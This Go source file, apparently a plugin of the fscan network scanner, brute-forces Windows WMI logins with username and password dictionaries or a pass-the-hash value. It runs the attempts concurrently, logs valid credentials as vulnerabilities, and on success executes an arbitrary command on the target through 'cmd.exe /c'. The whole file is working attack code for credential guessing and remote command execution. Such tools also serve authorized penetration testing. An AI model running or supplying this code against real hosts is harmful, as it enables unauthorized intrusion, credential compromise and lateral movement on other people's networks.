package Plugins

import (
	"errors"
	"fmt"
	"github.com/shadow1ng/fscan/common"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/C-Sto/goWMIExec/pkg/wmiexec"
)

var ClientHost string
var flag bool

func init() {
	if flag {
		return
	}
	clientHost, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
	}
	ClientHost = clientHost
	flag = true
}

func WmiExec(info *common.HostInfo) (tmperr error) {
	if common.IsBrute {
		return nil
	}
	starttime := time.Now().Unix()

	// -br（common.BruteThread）并发爆破：预组装 user×pass 组合，顺序与原双重 for 循环完全一致
	// （user 主序、password 次序），并保留 {user} 占位符替换语义。
	// hash 认证不依赖密码，原逻辑每用户在首个密码尝试后 break PASS（len(common.Hash) == 32），
	// 因此该条件下每个用户只投递一个组合（替换后的首个密码），语义一致。
	type wmiCombo struct{ user, pass string }
	var combos []wmiCombo
	for _, user := range common.Userdict["smb"] {
		if len(common.Hash) == 32 {
			if len(common.Passwords) > 0 {
				pass := strings.Replace(common.Passwords[0], "{user}", user, -1)
				combos = append(combos, wmiCombo{user, pass})
			}
			continue
		}
		for _, pass := range common.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			combos = append(combos, wmiCombo{user, pass})
		}
	}
	if len(combos) == 0 {
		return tmperr
	}

	// worker 数；common.BruteThread 默认 1
	workers := common.BruteThread
	if workers < 1 {
		workers = 1
	}
	// 预算：沿用原公式（字典全组合数 × Timeout 秒），只按 worker 数摊薄；
	// workers=1 时与原表达式一致。
	budget := int64(len(common.Userdict["smb"])*len(common.Passwords)) * common.Timeout / int64(workers)

	// 共享状态全部由 mu 保护：found/sucErr/stopped 以及具名返回值 tmperr
	var (
		mu      sync.Mutex
		found   bool
		stopped bool // 终态已发生，close(stop) 只会执行一次
		sucErr  error
	)
	stop := make(chan struct{})
	// signalStop：调用方必须持有 mu；stopped 保证不会重复 close(stop)（panic）
	signalStop := func() {
		if !stopped {
			stopped = true
			close(stop)
		}
	}

	// 预填充有缓冲 channel：容量=组合数，投递不阻塞，worker 提前退出也不会死锁
	jobs := make(chan wmiCombo, len(combos))
	for _, c := range combos {
		jobs <- c
	}
	close(jobs)

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for c := range jobs {
				select {
				case <-stop:
					return // 已有结果，立即退出（无忙等）
				default:
				}
				if workers > 1 && time.Now().Unix()-starttime > budget {
					return // 预算兜底，仅并发模式在尝试前检查；br=1 保持原判定位置（失败日志之后）
				}
				flag, err := Wmiexec(info, c.user, c.pass, common.Hash)
				mu.Lock()
				if stopped {
					// 终态之后到达的结果静默丢弃，避免成功后追加 [-] 日志或重复 [vul]；
					// br=1 单 worker 时不会走到这里。
					mu.Unlock()
					return
				}
				if flag == true {
					var result string
					if common.Domain != "" {
						result = fmt.Sprintf("[vul] WmiExec %v:%v:%v\\%v ", info.Host, info.Ports, common.Domain, c.user)
					} else {
						result = fmt.Sprintf("[vul] WmiExec %v:%v:%v ", info.Host, info.Ports, c.user)
					}
					if common.Hash != "" {
						result += "hash: " + common.Hash
					} else {
						result += c.pass
					}
					common.LogSuccess(result)
					found = true
					sucErr = err // 原成功路径 return err：认证成功但命令执行失败时 err 可能非 nil，保持原样
					signalStop()
					mu.Unlock()
					return
				}
				// L1: [-] 日志只在失败(flag==false)时输出。原实现在 flag 判定之前
				// 无条件打印, 认证成功时先输出 "[-] WmiExec <host>:445 <user> <pass> <nil>"
				// 垃圾行再打 [vul]；失败路径的 [-] 行为与原实现完全一致。
				// flag && err!=nil(认证成功但命令执行失败)由返回值 sucErr 携带, 不再打 [-]。
				errlog := fmt.Sprintf("[-] WmiExec %v:%v %v %v %v", info.Host, 445, c.user, c.pass, err)
				errlog = strings.Replace(errlog, "\n", "", -1)
				common.LogError(errlog)
				tmperr = err
				if common.CheckErrs(err) {
					signalStop()
					mu.Unlock()
					return
				}
				if time.Now().Unix()-starttime > budget {
					mu.Unlock()
					return
				}
				mu.Unlock()
			}
		}()
	}
	wg.Wait()
	if found {
		return sucErr
	}
	return tmperr
}

func Wmiexec(info *common.HostInfo, user string, pass string, hash string) (flag bool, err error) {
	target := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	wmiexec.Timeout = int(common.Timeout)
	return WMIExec(target, user, pass, hash, common.Domain, common.Command, ClientHost, "", nil)
}

func WMIExec(target, username, password, hash, domain, command, clientHostname, binding string, cfgIn *wmiexec.WmiExecConfig) (flag bool, err error) {
	if cfgIn == nil {
		cfg, err1 := wmiexec.NewExecConfig(username, password, hash, domain, target, clientHostname, true, nil, nil)
		if err1 != nil {
			err = err1
			return
		}
		cfgIn = &cfg
	}
	execer := wmiexec.NewExecer(cfgIn)
	err = execer.SetTargetBinding(binding)
	if err != nil {
		return
	}

	err = execer.Auth()
	if err != nil {
		return
	}
	flag = true

	if command != "" {
		command = "C:\\Windows\\system32\\cmd.exe /c " + command
		if execer.TargetRPCPort == 0 {
			err = errors.New("RPC Port is 0, cannot connect")
			return
		}

		err = execer.RPCConnect()
		if err != nil {
			return
		}
		err = execer.Exec(command)
		if err != nil {
			return
		}
	}
	return
}
